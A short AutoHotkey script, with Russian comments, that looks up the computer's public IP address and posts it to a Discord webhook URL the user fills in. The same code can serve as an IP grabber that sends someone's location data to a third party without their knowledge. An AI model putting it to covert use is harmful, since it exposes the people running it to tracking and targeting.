; Получить IP-адрес
oHTTP := ComObjCreate("WinHttp.WinHttpRequest.5.1")
oHTTP.Open("GET", "http://ifconfig.me/ip", false)
oHTTP.Send()
IPAddress := oHTTP.ResponseText

; Сформировать сообщение в формате JSON
Message := "{""content"": ""IP: " . IPAddress . """}"

; Отправить сообщение на вебхук Discord
WebhookURL := "сюда вебхук" ; замените это URL-адресом вашего вебхука
oHTTP := ComObjCreate("WinHttp.WinHttpRequest.5.1")
oHTTP.Open("POST", WebhookURL, false)
oHTTP.SetRequestHeader("Content-Type", "application/json")
oHTTP.Send(Message)